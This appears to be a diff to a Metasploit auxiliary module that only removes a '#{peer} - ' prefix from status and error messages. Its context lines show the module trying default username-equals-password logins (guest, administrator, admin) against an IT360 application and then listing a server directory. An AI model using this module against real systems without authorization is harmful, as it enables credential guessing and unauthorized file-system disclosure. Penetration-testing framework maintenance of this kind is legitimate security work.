@@ -154,7 +154,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     if datastore['USERNAME'] && datastore['PASSWORD']
-      print_status("#{peer} - Trying to authenticate as #{datastore['USERNAME']}/#{datastore['PASSWORD']}...")
+      print_status("Trying to authenticate as #{datastore['USERNAME']}/#{datastore['PASSWORD']}...")
       cookie = authenticate_it360(uri[0], uri[1], datastore['USERNAME'], datastore['PASSWORD'])
       unless cookie.nil?
         return cookie
@@ -164,7 +164,7 @@ class Metasploit3 < Msf::Auxiliary
     default_users = ['guest', 'administrator', 'admin']
 
     default_users.each do |user|
-      print_status("#{peer} - Trying to authenticate as #{user}...")
+      print_status("Trying to authenticate as #{user}...")
       cookie = authenticate_it360(uri[0], uri[1], user, user)
       unless cookie.nil?
         return cookie
@@ -182,14 +182,14 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     if detect_it360
-      print_status("#{peer} - Detected IT360, attempting to login...")
+      print_status("Detected IT360, attempting to login...")
       cookie = login_it360
     else
       cookie = get_cookie
     end
 
     if cookie.nil?
-      print_error("#{peer} - Failed to get application cookies!")
+      print_error("Failed to get application cookies!")
       return
     end
 
@@ -205,7 +205,7 @@ class Metasploit3 < Msf::Auxiliary
 
     # Create request
     begin
-      print_status("#{peer} - Listing directory #{datastore['DIRECTORY']}")
+      print_status("Listing directory #{datastore['DIRECTORY']}")
       res = send_request_cgi({
         'method' => 'POST',
         'cookie' => cookie,
@@ -216,7 +216,7 @@ class Metasploit3 < Msf::Auxiliary
         }
       })
     rescue Rex::ConnectionRefused
-      print_error("#{peer} - Could not connect.")
+      print_error("Could not connect.")
       return
     end
 
@@ -234,7 +234,7 @@ class Metasploit3 < Msf::Auxiliary
       )
       print_good("File with directory listing saved in: #{path}")
     else
-      print_error("#{peer} - Failed to list directory.")
+      print_error("Failed to list directory.")
     end
   end
 end
